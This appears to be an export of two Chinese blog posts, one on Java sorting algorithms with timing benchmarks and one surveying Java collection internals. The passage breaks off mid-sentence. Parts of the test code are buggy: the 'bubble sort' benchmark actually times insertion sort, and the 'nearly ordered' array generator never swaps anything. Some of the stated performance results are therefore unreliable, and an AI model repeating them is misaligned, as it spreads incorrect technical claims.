    <content type="text"><![CDATA[初级排序算法的实现和性能测试 1. 冒泡排序 原理：外层循环遍历整个数组，内层循环就将本循环中最大的数冒泡到最后面。比较是相邻的两个元素比较，交换也发生在这两个元素之间。 特点：冒泡排序总的平均时间复杂度为 O(n^2) 优点：稳定的排序 实现：12345678910111213public class BubbleSort &#123; public static void sort(int[] array)&#123; for(int i=0; i&lt;array.length; i++)&#123; for(int j=0;j&lt;array.length-i-1;j++)&#123; if(array[j]&gt;array[j+1])&#123; int temp = array[j]; array[j] = array[j+1]; array[j+1] = temp; &#125; &#125; &#125; &#125;&#125; 2. 选择排序 原理：外层循环遍历整个数组，每次进行内层循环时，先记录内层遍历的第一个值，通过比较将，如果发现了最小的值，就将其与第一个位置元素进行交换。 特点：不稳定，时间复杂度为O(n^2) 优点：交换次数比冒泡排序少多了，由于交换所需CPU时间比比较所需的CPU时间多，n值较小时，选择排序比冒泡排序快. 实现：1234567891011121314public class SelectSort &#123; public static void sort(int[] array)&#123; int len = array.length; for(int i=0; i&lt;len; i++)&#123; int min = i; for(int j=i; j&lt;len; j++)&#123; if(array[j]&lt;array[min]) min = j; &#125; TestHelper.swap(array, i, min); &#125; &#125;&#125; 3. 插入排序3.1 插入排序未优化 原理：外层循环i从第二个数开始向右遍历，内层循环从i递减向左遍历，如果左边个数小于右边的数，就交换。 特点1：时间复杂度为O(n^2)。是稳定的排序方法。 特点2：算法适用于少量数据的排序，如果数据本身有序，效率比较高 实现：12345678public static void sort(int[] array)&#123; int len = array.length; for(int i=1;i&lt;len;i++)&#123; for(int j=i; j&gt;0 &amp;&amp; array[j-1]&gt;array[j]; j--)&#123; TestHelper.swap(array, j, j-1); &#125; &#125;&#125; 3.2 插入排序优化 原理：针对上面个方法的内层循环，原理是每次比较，如果前面的数大于后面的数，两个数就进行交换，但是其实不要交换，我们只需要将j=i这个边界的值保存下来，然后依次与前面的值进行比较，如果前面的这个数比较小，那么就将他后移一位（赋值到后面一个：array[j] = array[j-1];），直到遇到比他大或者相等的数的时候就停止。这样将频繁的交换操作换成了赋值操作，效率会得到提升。 实现：123456789101112public static void sort02(int[] array)&#123; int len = array.length; for(int i=1; i&lt;len; i++)&#123; int tmp = array[i]; int j; for(j=i;j&gt;0&amp;&amp;array[j-1]&gt;tmp;j--)&#123; //将交换操作变为赋值，效率提高点 array[j] = array[j-1]; &#125; array[j] = tmp; &#125;&#125; 4. 希尔排序 原理：按照增量对原数组进行分组，举个例子： 1234567891011121314151617181920212223242526272829有这样一个简单数组：int[] array = &#123;10,9,8,7,6,5,4,3,2,1&#125;我们要对其进行升序排序。用希尔排序处理思路是：先取一个合适的增量，我的机制是初始增量为数组长度的一半。那么原来的数组就会被切割为：10 5(第0个数和第5个数)9 4(第1个数和第6个数)8 3(第2个数和第7个数)7 2(第3个数和第8个数)6 1(第4个数和第9个数)对这5组分别进行插入排序得到：5 10(第0个数和第5个数)4 9(第1个数和第6个数)3 8(第2个数和第7个数)2 7(第3个数和第8个数)1 6(第4个数和第9个数)那么此时数组元素为：5 4 3 2 1 10 9 8 7 6下面再将增量缩小一半为5/2=2,那么数组就被切割为：5 3 1 9 7和4 2 10 8 6对其插入排序得：1 3 5 7 9和2 4 6 8 10此时数组变为：1 2 3 4 5 6 7 8 9 10，完全有序了。再将增量缩小为原来的一半为2/2=1和1/2=0，数组其实都不变了。 具体可参照：https://www.cnblogs.com/chengxiao/p/6104371.html 实现：12345678910111213141516171819202122232425public static void ShellSort(int num[]) &#123; int temp; //默认步长为数组长度除以2 int step = num.length; while (true) &#123; step = step / 2; //确定分组数 for (int i = 0; i &lt; step; i++) &#123; //对分组数据进行直接插入排序 for (int j = i + step; j &lt; num.length; j = j + step) &#123; temp=num[j]; int k; //对分组内元素进行插入排序 for( k=j-step;k&gt;=0&amp;&amp;num[k]&gt;temp;k=k-step)&#123; num[k+step]=num[k]; &#125; num[k+step]=temp; &#125; &#125; System.out.println(Arrays.toString(num)); if (step == 1) &#123; break; &#125; &#125;&#125; 5. 算法性能测试123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195public class TestHelper &#123; // 生成随机的int数组 public static int[] generateRandomArray(int n) &#123; int[] result = new int[n]; for (int i = 0; i &lt; n; i++) &#123; result[i] = (int) (Math.random() * (n * 10)); &#125; return result; &#125; // 生成近乎有序的int数组 public static int[] generateNearlyOrderedArray(int n, int swapTimes) &#123; int[] arr = new int[n]; for (int i = 0; i &lt; n; i++) &#123; arr[i] = i; &#125; int temp; for (int j = 0; j &lt; swapTimes; j++) &#123; int x = (int) Math.random() * n; int y = (int) Math.random() * n; temp = arr[x]; arr[x] = arr[y]; arr[y] = temp; &#125; return arr; &#125; public static void swap(int[] arr,int i,int min)&#123; int temp = arr[i]; arr[i] = arr[min]; arr[min] = temp; &#125; //1.测试选择排序的正确性 public static void testSelectSortOK()&#123; int[] arr = TestHelper.generateRandomArray(10); System.out.println("排序前：-------"); for(int i=0; i&lt;arr.length; i++)&#123; System.out.print(arr[i] + " "); &#125; SelectSort.sort(arr); System.out.println(); System.out.println("排序后：-------"); for(int i=0; i&lt;arr.length; i++)&#123; System.out.print(arr[i] + " "); &#125; &#125; //1.测试选择排序性能(随机无序) public static void testSelectSort(int n)&#123; long startTime = System.currentTimeMillis(); //获取开始时间 SelectSort.sort(TestHelper.generateRandomArray(n)); long endTime = System.currentTimeMillis(); //获取结束时间 System.out.println("\n" + "SelectSort(随机无序) 共耗时：" + (endTime - startTime) + "ms"); &#125; //1.测试选择排序性能(近乎有序) public static void testSelectSortOrdered(int n,int swaptimes)&#123; long startTime = System.currentTimeMillis(); //获取开始时间 SelectSort.sort(TestHelper.generateNearlyOrderedArray(n,swaptimes)); long endTime = System.currentTimeMillis(); //获取结束时间 System.out.println("\n" + "SelectSort(近乎有序) 共耗时：" + (endTime - startTime) + "ms"); &#125; //2.测试插入排序的正确性 public static void testInsertSortOK()&#123; int[] arr = TestHelper.generateRandomArray(10); System.out.println("排序前：-------"); for(int i=0; i&lt;arr.length; i++)&#123; System.out.print(arr[i] + " "); &#125; InsertSort.sort(arr); System.out.println(); System.out.println("排序后：-------"); for(int i=0; i&lt;arr.length; i++)&#123; System.out.print(arr[i] + " "); &#125; &#125; //2.插入排序的性能测试 public static void testInsertSort(int n)&#123; long startTime = System.currentTimeMillis(); //获取开始时间 InsertSort.sort(TestHelper.generateRandomArray(n)); long endTime = System.currentTimeMillis(); //获取结束时间 System.out.println("\n" + "InsertionSort(未优化，随机无序) 共耗时：" + (endTime - startTime) + "ms"); &#125; //2.插入排序的性能测试 public static void testInsertSortOrdered(int n,int swaptimes)&#123; long startTime = System.currentTimeMillis(); //获取开始时间 InsertSort.sort(TestHelper.generateNearlyOrderedArray(n,swaptimes)); long endTime = System.currentTimeMillis(); //获取结束时间 System.out.println("\n" + "InsertionSort(未优化，近乎有序) 共耗时：" + (endTime - startTime) + "ms"); &#125; //3.插入排序优化版本的正确性测试 public static void testInsertSort02OK()&#123; int[] arr = TestHelper.generateRandomArray(10); System.out.println("排序前：-------"); for(int i=0; i&lt;arr.length; i++)&#123; System.out.print(arr[i] + " "); &#125; InsertSort.sort02(arr); System.out.println(); System.out.println("排序后：-------"); for(int i=0; i&lt;arr.length; i++)&#123; System.out.print(arr[i] + " "); &#125; &#125; //3.插入排序优化版本的性能测试 public static void testInsertSort02(int n)&#123; long startTime = System.currentTimeMillis(); //获取开始时间 InsertSort.sort02(TestHelper.generateRandomArray(n)); long endTime = System.currentTimeMillis(); //获取结束时间 System.out.println("\n" + "InsertionSort02(优化，随机无序) 共耗时：" + (endTime - startTime) + "ms"); &#125; //3.插入排序优化版本的性能测试 public static void testInsertSort02Ordered(int n,int swaptimes)&#123; long startTime = System.currentTimeMillis(); //获取开始时间 InsertSort.sort02(TestHelper.generateNearlyOrderedArray(n,swaptimes)); long endTime = System.currentTimeMillis(); //获取结束时间 System.out.println("\n" + "InsertionSort02(优化，近乎有序) 共耗时：" + (endTime - startTime) + "ms"); &#125; //4.冒泡排序的正确性测试 public static void testBubbleSortOK()&#123; int[] arr = TestHelper.generateRandomArray(10); System.out.println("排序前：-------"); for(int i=0; i&lt;arr.length; i++)&#123; System.out.print(arr[i] + " "); &#125; BubbleSort.sort(arr); System.out.println(); System.out.println("排序后：-------"); for(int i=0; i&lt;arr.length; i++)&#123; System.out.print(arr[i] + " "); &#125; &#125; //4.冒泡排序的性能测试 public static void testBubbleSort(int n)&#123; long startTime = System.currentTimeMillis(); //获取开始时间 InsertSort.sort02(TestHelper.generateRandomArray(n)); long endTime = System.currentTimeMillis(); //获取结束时间 System.out.println("\n" + "BubbleSort(随机无序) 共耗时：" + (endTime - startTime) + "ms"); &#125; //5.希尔排序正确性测试 public static void testShellSortOK()&#123; int[] arr = TestHelper.generateRandomArray(10); System.out.println("排序前：-------"); for(int i=0; i&lt;arr.length; i++)&#123; System.out.print(arr[i] + " "); &#125; ShellSort.sort(arr,2); System.out.println(); System.out.println("排序后：-------"); for(int i=0; i&lt;arr.length; i++)&#123; System.out.print(arr[i] + " "); &#125; &#125; //5.希尔排序的性能测试(随机无序) public static void testShellSort(int n)&#123; long startTime = System.currentTimeMillis(); //获取开始时间 ShellSort.sort(TestHelper.generateRandomArray(n),n/2); long endTime = System.currentTimeMillis(); //获取结束时间 System.out.println("\n" + "ShellSort(随机无序) 共耗时：" + (endTime - startTime) + "ms"); &#125; //5.希尔排序的性能测试(近乎有序) public static void testInsertShellOrdered(int n,int swaptimes)&#123; long startTime = System.currentTimeMillis(); //获取开始时间 ShellSort.sort(TestHelper.generateNearlyOrderedArray(n,swaptimes),n/2); long endTime = System.currentTimeMillis(); //获取结束时间 System.out.println("\n" + "ShellSort(近乎有序) 共耗时：" + (endTime - startTime) + "ms"); &#125;&#125; 用main函数进行测试： 123456789101112131415161718192021222324252627public class Main &#123; public static void main(String[] args) &#123; //选择排序性能测试 TestHelper.testSelectSort(100000); TestHelper.testSelectSortOrdered(100000, 10); //插入排序01版本性能测试，发现10000数据用时竟然比选择排序还要多，数据少一点的时候，表现稍微好一点 TestHelper.testInsertSort(100000); TestHelper.testInsertSortOrdered(1000000, 10);//注意这是100 0000数据 //插入排序的02版本性能测试 TestHelper.testInsertSort02(100000); TestHelper.testInsertSort02Ordered(1000000, 10);//注意这是100 0000数据 //冒泡排序的性能测试 TestHelper.testBubbleSort(100000); //希尔排序性能测试 TestHelper.testShellSort(100000); TestHelper.testInsertShellOrdered(1000000, 10);//注意这是100 0000数据 &#125;&#125; 测试结果(多次运行验证基本差不多)： 1234567891011121314151617SelectSort(随机无序) 共耗时：3070msSelectSort(近乎有序) 共耗时：2935msInsertionSort(未优化，随机无序) 共耗时：3922msInsertionSort(未优化，近乎有序) 共耗时：9msInsertionSort02(优化，随机无序) 共耗时：3445msInsertionSort02(优化，近乎有序) 共耗时：7msBubbleSort(随机无序) 共耗时：1290msShellSort(随机无序) 共耗时：40msShellSort(近乎有序) 共耗时：27ms 可以看出来： 有序无序对于选择排序没有任何影响，都很差 对于插入排序影响很大，对于有序数组，效率惊人 希尔排序在有序无序的情况下都表现不错 冒泡排序基本不考虑用]]></content>
      <tags>
        <tag>数据结构与算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[1、Java容器概览]]></title>
    <url>%2F2018%2F07%2F21%2F1%E3%80%81Java%E5%AE%B9%E5%99%A8%E6%A6%82%E8%A7%88%2F</url>
    <content type="text"><![CDATA[容器主要包括 Collection 和 Map 两种，Collection 又包含了 List、Set 以及 Queue。 Collection 1. Set HashSet：基于哈希实现，支持快速查找，但不支持有序性操作，例如根据一个范围查找元素的操作。并且失去了元素的插入顺序信息，也就是说使用 Iterator 遍历 HashSet 得到的结果是不确定的； TreeSet：基于红黑树实现，支持有序性操作，但是查找效率不如HashSet，HashSet 查找时间复杂度为 O(1)，TreeSet 则为 O(logN)； LinkedHashSet：具有 HashSet 的查找效率，且内部使用链表维护元素的插入顺序。 2. List ArrayList：基于动态数组实现，支持随机访问； Vector：和 ArrayList 类似，但它是线程安全的； LinkedList：基于双向链表实现，只能顺序访问，但是可以快速地在链表中间插入和删除元素。不仅如此，LinkedList 还可以用作栈、队列和双向队列。 3. Queue LinkedList：可以用它来支持双向队列； PriorityQueue：基于堆结构实现，可以用它来实现优先队列。 Map HashMap：基于哈希实现； HashTable：和 HashMap 类似，但它是线程安全的，这意味着同一时刻多个线程可以同时写入 HashTable 并且不会导致数据不一致。它是遗留类，不应该去使用它。现在可以使用 ConcurrentHashMap 来支持线程安全，并且 ConcurrentHashMap 的效率会更高，因为 ConcurrentHashMap 引入了分段锁。 LinkedHashMap：使用链表来维护元素的顺序，顺序为插入顺序或者最近最少使用（LRU）顺序。 TreeMap：基于红黑树实现。 二、容器中的设计模式迭代器模式 Collection 实现了 Iterable 接口，其中的 iterator() 方法能够产生一个 Iterator 对象，通过这个对象就可以迭代遍历 Collection 中的元素。 从 JDK 1.5 之后可以使用 foreach 方法来遍历实现了 Iterable 接口的聚合对象。 123456List&lt;String&gt; list = new ArrayList&lt;&gt;();list.add("a");list.add("b");for (String item : list) &#123; System.out.println(item);&#125; 适配器模式java.util.Arrays#asList() 可以把数组类型转换为 List 类型。 12@SafeVarargspublic static &lt;T&gt; List&lt;T&gt; asList(T... a) 如果要将数组类型转换为 List 类型，应该注意的是 asList() 的参数为泛型的变长参数，因此不能使用基本类型数组作为参数，只能使用相应的包装类型数组。 12Integer[] arr = &#123;1, 2, 3&#125;;List list = Arrays.asList(arr); 也可以使用以下方式生成 List。 1List list = Arrays.asList(1,2,3); 三、源码分析(概述)ArrayList1. 概览实现了 RandomAccess 接口，因此支持随机访问，这是理所当然的，因为 ArrayList 是基于数组实现的。 12public class ArrayList&lt;E&gt; extends AbstractList&lt;E&gt; implements List&lt;E&gt;, RandomAccess, Cloneable, java.io.Serializable 数组的默认大小为 10。 1private static final int DEFAULT_CAPACITY = 10; 2. 序列化基于数组实现，保存元素的数组使用 transient 修饰，该关键字声明数组默认不会被序列化。ArrayList 具有动态扩容特性，因此保存元素的数组不一定都会被使用，那么就没必要全部进行序列化。ArrayList 重写了 writeObject() 和 readObject() 来控制只序列化数组中有元素填充那部分内容。 1transient Object[] elementData; // non-private to simplify nested class access 3. 扩容添加元素时使用 ensureCapacityInternal() 方法来保证容量足够，如果不够时，需要使用 grow() 方法进行扩容，新容量的大小为 oldCapacity + (oldCapacity &gt;&gt; 1)，也就是旧容量的 1.5 倍。 扩容操作需要调用 Arrays.copyOf() 把原数组整个复制到新数组中，因此最好在创建 ArrayList 对象时就指定大概的容量大小，减少扩容操作的次数 4. 删除元素需要调用 System.arraycopy() 将 index+1 后面的元素都复制到 index 位置上，复制的代价很高。 5. Fail-FastmodCount 用来记录 ArrayList 结构发生变化的次数。结构发生变化是指添加或者删除至少一个元素的所有操作，或者是调整内部数组的大小，仅仅只是设置元素的值不算结构发生变化。 在进行序列化或者迭代等操作时，需要比较操作前后 modCount 是否改变，如果改变了需要抛出 ConcurrentModificationException。 123456789101112131415161718private void writeObject(java.io.ObjectOutputStream s) throws java.io.IOException&#123; // Write out element count, and any hidden stuff int expectedModCount = modCount; s.defaultWriteObject(); // Write out size as capacity for behavioural compatibility with clone() s.writeInt(size); // Write out all elements in the proper order. for (int i=0; i&lt;size; i++) &#123; s.writeObject(elementData[i]); &#125; if (modCount != expectedModCount) &#123; throw new ConcurrentModificationException(); &#125;&#125; Vector1. 同步它的实现与 ArrayList 类似，但是使用了 synchronized 进行同步。 12345678910111213public synchronized boolean add(E e) &#123; modCount++; ensureCapacityHelper(elementCount + 1); elementData[elementCount++] = e; return true;&#125;public synchronized E get(int index) &#123; if (index &gt;= elementCount) throw new ArrayIndexOutOfBoundsException(index); return elementData(index);&#125; 2. ArrayList 与 Vector Vector 和 ArrayList 几乎是完全相同的，唯一的区别在于 Vector 是同步的，因此开销就比 ArrayList 要大，访问速度更慢。最好使用 ArrayList 而不是 Vector，因为同步操作完全可以由程序员自己来控制； Vector 每次扩容请求其大小的 2 倍空间，而 ArrayList 是 1.5 倍。 3. Vector 替代方案为了获得线程安全的 ArrayList，可以使用 Collections.synchronizedList(); 得到一个线程安全的 ArrayList，也可以使用 concurrent 并发包下的 CopyOnWriteArrayList 类； 12List&lt;String&gt; list = new ArrayList&lt;&gt;();List&lt;String&gt; synList = Collections.synchronizedList(list); 1List list = new CopyOnWriteArrayList(); LinkedList1. 概览基于双向链表实现，内部使用 Node 来存储链表节点信息。 12345private static class Node&lt;E&gt; &#123; E item; Node&lt;E&gt; next; Node&lt;E&gt; prev;&#125; 每个链表存储了 Head 和 Tail 指针： 12transient Node&lt;E&gt; first;transient Node&lt;E&gt; last; 2. ArrayList 与 LinkedList ArrayList 基于动态数组实现，LinkedList 基于双向链表实现； ArrayList 支持随机访问，LinkedList 不支持； LinkedList 在任意位置添加删除元素更快。 HashMap为了便于理解，以下内容以 JDK 1.7 为主。 1. 存储结构使用拉链法来解决冲突，内部包含了一个 Entry 类型的数组 table，数组中的每个位置被当成一个桶。 1transient Entry[] table; 其中，Entry 就是存储数据的键值对，它包含了四个字段。从 next 字段我们可以看出 Entry 是一个链表，即每个桶会存放一个链表。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465static class Entry&lt;K,V&gt; implements Map.Entry&lt;K,V&gt; &#123; final K key; V value; Entry&lt;K,V&gt; next; int hash; Entry(int h, K k, V v, Entry&lt;K,V&gt; n) &#123; value = v; next = n; key = k; hash = h; &#125; public final K getKey() &#123; return key; &#125; public final V getValue() &#123; return value; &#125; public final V setValue(V newValue) &#123; V oldValue = value; value = newValue; return oldValue; &#125; public final boolean equals(Object o) &#123; if (!(o instanceof Map.Entry)) return false; Map.Entry e = (Map.Entry)o; Object k1 = getKey(); Object k2 = e.getKey(); if (k1 == k2 || (k1 != null &amp;&amp; k1.equals(k2))) &#123; Object v1 = getValue(); Object v2 = e.getValue(); if (v1 == v2 || (v1 != null &amp;&amp; v1.equals(v2))) return true; &#125; return false; &#125; public final int hashCode() &#123; return Objects.hashCode(getKey()) ^ Objects.hashCode(getValue()); &#125; public final String toString() &#123; return getKey() + "=" + getValue(); &#125; /** * This method is invoked whenever the value in an entry is * overwritten by an invocation of put(k,v) for a key k that's already * in the HashMap. */ void recordAccess(HashMap&lt;K,V&gt; m) &#123; &#125; /** * This method is invoked whenever the entry is * removed from the table. */ void recordRemoval(HashMap&lt;K,V&gt; m) &#123; &#125;&#125; 2. 拉链法的工作原理1234HashMap&lt;String, String&gt; map = new HashMap&lt;&gt;();map.put("K1", "V1");map.put("K2", "V2");map.put("K3", "V3"); 新建一个 HashMap，默认大小为 16； 插入 &lt;K1,V1&gt; 键值对，先计算 K1 的 hashCode 为 115，使用除留余数法得到所在的桶下标 115%16=3。 插入 &lt;K2,V2&gt; 键值对，先计算 K2 的 hashCode 为 118，使用除留余数法得到所在的桶下标 118%16=6。 插入 &lt;K3,V3&gt; 键值对，先计算 K3 的 hashCode 为 118，使用除留余数法得到所在的桶下标 118%16=6，插在 &lt;K2,V2&gt; 前面。 应该注意到链表的插入是以头插法方式进行的，例如上面的 &lt;K3,V3&gt; 不是插在 &lt;K2,V2&gt; 后面，而是插入在链表头部。(注意这是jdk8以前的做法，jdk8已经对其进行了修改，具体看HashMap以及HashMap死循环问题的阐述) 查找需要分成两步进行： 计算键值对所在的桶； 在链表上顺序查找，时间复杂度显然和链表的长度成正比。 3. put 操作1234567891011121314151617181920212223242526public V put(K key, V value) &#123; if (table == EMPTY_TABLE) &#123; inflateTable(threshold); &#125; // 键为 null 单独处理 if (key == null) return putForNullKey(value); int hash = hash(key); // 确定桶下标 int i = indexFor(hash, table.length); // 先找出是否已经存在键为 key 的键值对，如果存在的话就更新这个键值对的值为 value for (Entry&lt;K,V&gt; e = table[i]; e != null; e = e.next) &#123; Object k; if (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) &#123; V oldValue = e.value; e.value = value; e.recordAccess(this); return oldValue; &#125; &#125; modCount++; // 插入新键值对 addEntry(hash, key, value, i); return null;&#125; HashMap 允许插入键位 null 的键值对，因为无法调用 null 的 hashCode()，也就无法确定该键值对的桶下标，只能通过强制指定一个桶下标来存放。HashMap 使用第 0 个桶存放键为 null 的键值对。 12345678910111213private V putForNullKey(V value) &#123; for (Entry&lt;K,V&gt; e = table[0]; e != null; e = e.next) &#123; if (e.key == null) &#123; V oldValue = e.value; e.value = value; e.recordAccess(this); return oldValue; &#125; &#125; modCount++; addEntry(0, null, value, 0); return null;&#125; 使用链表的头插法，也就是新的键值对插在链表的头部，而不是链表的尾部。 12345678910111213141516void addEntry(int hash, K key, V value, int bucketIndex) &#123; if ((size &gt;= threshold) &amp;&amp; (null != table[bucketIndex])) &#123; resize(2 * table.length); hash = (null != key) ? hash(key) : 0; bucketIndex = indexFor(hash, table.length); &#125; createEntry(hash, key, value, bucketIndex);&#125;void createEntry(int hash, K key, V value, int bucketIndex) &#123; Entry&lt;K,V&gt; e = table[bucketIndex]; // 头插法，链表头部指向新的键值对 table[bucketIndex] = new Entry&lt;&gt;(hash, key, value, e); size++;&#125; 123456Entry(int h, K k, V v, Entry&lt;K,V&gt; n) &#123; value = v; next = n; key = k; hash = h;&#125; 4. 确定桶下标很多操作都需要先确定一个键值对所在的桶下标。 12int hash = hash(key);int i = indexFor(hash, table.length); （一）计算 hash 值 1234567891011121314final int hash(Object k) &#123; int h = hashSeed; if (0 != h &amp;&amp; k instanceof String) &#123; return sun.misc.Hashing.stringHash32((String) k); &#125; h ^= k.hashCode(); // This function ensures that hashCodes that differ only by // constant multiples at each bit position have a bounded // number of collisions (approximately 8 at default load factor). h ^= (h &gt;&gt;&gt; 20) ^ (h &gt;&gt;&gt; 12); return h ^ (h &gt;&gt;&gt; 7) ^ (h &gt;&gt;&gt; 4);&#125; 123public final int hashCode() &#123; return Objects.hashCode(key) ^ Objects.hashCode(value);&#125; （二）取模 令 x = 1&lt;&lt;4，即 x 为 2 的 4 次方，它具有以下性质： 12x : 00010000x-1 : 00001111 令一个数 y 与 x-1 做与运算，可以去除 y 位级表示的第 4 位以上数： 123y : 10110010x-1 : 00001111y&amp;(x-1) : 00000010 这个性质和 y 对 x 取模效果是一样的： 123x : 00010000y : 10110010y%x : 00000010 我们知道，位运算的代价比求模运算小的多，因此在进行这种计算时能用位运算的话能带来更高的性能。 确定桶下标的最后一步是将 key 的 hash 值对桶个数取模：hash%capacity，如果能保证 capacity 为 2 的幂次方，那么就可以将这个操作转换为位运算。 123static int indexFor(int h, int length) &#123; return h &amp; (length-1);&#125; 5. 扩容-基本原理设 HashMap 的 table 长度为 M，需要存储的键值对数量为 N，如果哈希函数满足均匀性的要求，那么每条链表的长度大约为 N/M，因此平均查找次数的复杂度为 O(N/M)。 为了让查找的成本降低，应该尽可能使得 N/M 尽可能小，因此需要保证 M 尽可能大，也就是说 table 要尽可能大。HashMap 采用动态扩容来根据当前的 N 值来调整 M 值，使得空间效率和时间效率都能得到保证。 和扩容相关的参数主要有：capacity、size、threshold 和 load_factor。 参数 含义 capacity table 的容量大小，默认为 16，需要注意的是 capacity 必须保证为 2 的次方。 size table 的实际使用量。 threshold size 的临界值，size 必须小于 threshold，如果大于等于，就必须进行扩容操作。 load_factor table 能够使用的比例，threshold = capacity * load_factor。 123456789101112131415static final int DEFAULT_INITIAL_CAPACITY = 16;static final int MAXIMUM_CAPACITY = 1 &lt;&lt; 30;static final float DEFAULT_LOAD_FACTOR = 0.75f;transient Entry[] table;transient int size;int threshold;final float loadFactor;transient int modCount; 从下面的添加元素代码中可以看出，当需要扩容时，令 capacity 为原来的两倍。 123456void addEntry(int hash, K key, V value, int bucketIndex) &#123; Entry&lt;K,V&gt; e = table[bucketIndex]; table[bucketIndex] = new Entry&lt;&gt;(hash, key, value, e); if (size++ &gt;= threshold) resize(2 * table.length);&#125; 扩容使用 resize() 实现，需要注意的是，扩容操作同样需要把旧 table 的所有键值对重新插入新的 table 中，因此这一步是很费时的。 12345678910111213141516171819202122232425262728293031void resize(int newCapacity) &#123; Entry[] oldTable = table; int oldCapacity = oldTable.length; if (oldCapacity == MAXIMUM_CAPACITY) &#123; threshold = Integer.MAX_VALUE; return; &#125; Entry[] newTable = new Entry[newCapacity]; transfer(newTable); table = newTable; threshold = (int)(newCapacity * loadFactor);&#125;void transfer(Entry[] newTable) &#123; Entry[] src = table; int newCapacity = newTable.length; for (int j = 0; j &lt; src.length; j++) &#123; Entry&lt;K,V&gt; e = src[j]; if (e != null) &#123; src[j] = null; do &#123; Entry&lt;K,V&gt; next = e.next; int i = indexFor(e.hash, newCapacity); e.next = newTable[i]; newTable[i] = e; e = next; &#125; while (e != null); &#125; &#125;&#125; 6. 扩容-重新计算桶下标在进行扩容时，需要把键值对重新放到对应的桶上。HashMap 使用了一个特殊的机制，可以降低重新计算桶下标的操作。 假设原数组长度 capacity 为 8，扩容之后 new capacity 为 16： 12capacity : 00010000new capacity : 00100000 对于一个 Key，它的 hash 如果在第 6 位上为 0，那么取模得到的结果和之前一样；如果为 1，那么得到的结果为原来的结果 + 8。 7. 扩容-计算数组容量HashMap 构造函数允许用户传入的容量不是 2 的幂次方，因为它可以自动地将传入的容量转换为 2 的幂次方。 先考虑如何求一个数的掩码，对于 10010000，它的掩码为 11111111，可以使用以下方法得到： 123mask |= mask &gt;&gt; 1 11011000mask |= mask &gt;&gt; 2 11111100mask |= mask &gt;&gt; 4 11111111 mask+1 是大于原始数字的最小的 2 幂次方。 12num 10010000mask+1 100000000 以下是 HashMap 中计算数组容量的代码： 123456789static final int tableSizeFor(int cap) &#123; int n = cap - 1; n |= n &gt;&gt;&gt; 1; n |= n &gt;&gt;&gt; 2; n |= n &gt;&gt;&gt; 4; n |= n &gt;&gt;&gt; 8; n |= n &gt;&gt;&gt; 16; return (n &lt; 0) ? 1 : (n &gt;= MAXIMUM_CAPACITY) ? MAXIMUM_CAPACITY : n + 1;&#125; 8. 链表转红黑树应该注意到，从 JDK 1.8 开始，一个桶存储的链表长度大于 8 时会将链表转换为红黑树。 9. HashMap 与 HashTable HashTable 是同步的，它使用了 synchronized 来进行同步。它也是线程安全的，多个线程可以共享同一个 HashTable。HashMap 不是同步的，但是可以使用 ConcurrentHashMap，它是 HashTable 的替代，而且比 HashTable 可扩展性更好。 HashMap 可以插入键为 null 的 Entry。 HashMap 的迭代器是 fail-fast 迭代器，而 Hashtable 的 enumerator 迭代器不是 fail-fast 的。 由于 Hashtable 是线程安全的也是 synchronized，所以在单线程环境下它比 HashMap 要慢。 HashMap 不能保证随着时间的推移 Map 中的元素次序是不变的。 ConcurrentHashMap1. 存储结构123456static final class HashEntry&lt;K,V&gt; &#123; final int hash; final K key; volatile V value; volatile HashEntry&lt;K,V&gt; next;&#125; Segment 继承自 ReentrantLock，每个 Segment 维护着多个 HashEntry。 ConcurrentHashMap 和 HashMap 实现上类似，最主要的差别是 ConcurrentHashMap 采用了分段锁，每个分段锁维护着几个桶，多个线程可以同时访问不同分段锁上的桶，从而使其并发度更高（并发度就是 Segment 的个数）。 1234567891011121314151617static final class Segment&lt;K,V&gt; extends ReentrantLock implements Serializable &#123; private static final long serialVersionUID = 2249069246763182397L; static final int MAX_SCAN_RETRIES = Runtime.getRuntime().availableProcessors() &gt; 1 ? 64 : 1; transient volatile HashEntry&lt;K,V&gt;[] table; transient int count; transient int modCount; transient int threshold; final float loadFactor;&#125; 1final Segment&lt;K,V&gt;[] segments; 默认的并发级别为 16，也就是说默认创建 16 个 Segment。 1static final int DEFAULT_CONCURRENCY_LEVEL = 16; 2. size 操作每个 Segment 维护了一个 count 变量来统计该 Segment 中的键值对个数。 12345/** * The number of elements. Accessed only either within locks * or among other volatile reads that maintain visibility. */transient int count; 在执行 size 操作时，需要遍历所有 Segment 然后把 count 累计起来。 ConcurrentHashMap 在执行 size 操作时先尝试不加锁，如果连续两次不加锁操作得到的结果一致，那么可以认为这个结果是正确的。 尝试次数使用 RETRIES_BEFORE_LOCK 定义，该值为 2，retries 初始值为 -1，因此尝试次数为 3。 如果尝试的次数超过 3 次，就需要对每个 Segment 加锁。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950/** * Number of unsynchronized retries in size and containsValue * methods before resorting to locking. This is used to avoid * unbounded retries if tables undergo continuous modification * which would make it impossible to obtain an accurate result. */static final int RETRIES_BEFORE_LOCK = 2;public int size() &#123; // Try a few times to get accurate count. On failure due to // continuous async changes in table, resort to locking. final Segment&lt;K,V&gt;[] segments = this.segments; int size; boolean overflow; // true if size overflows 32 bits long sum; // sum of modCounts long last = 0L; // previous sum int retries = -1; // first iteration isn't retry try &#123; for (;;) &#123; // 超过尝试次数，则对每个 Segment 加锁 if (retries++ == RETRIES_BEFORE_LOCK) &#123; for (int j = 0; j &lt; segments.length; ++j) ensureSegment(j).lock(); // force creation &#125; sum = 0L; size = 0; overflow = false; for (int j = 0; j &lt; segments.length; ++j) &#123; Segment&lt;K,V&gt; seg = segmentAt(segments, j); if (seg != null) &#123; sum += seg.modCount; int c = seg.count; if (c &lt; 0 || (size += c) &lt; 0) overflow = true; &#125; &#125; // 连续两次得到的结果一致，则认为这个结果是正确的 if (sum == last) break; last = sum; &#125; &#125; finally &#123; if (retries &gt; RETRIES_BEFORE_LOCK) &#123; for (int j = 0; j &lt; segments.length; ++j) segmentAt(segments, j).unlock(); &#125; &#125; return overflow ? Integer.MAX_VALUE : size;&#125; 3. JDK 1.8 的改动JDK 1.7 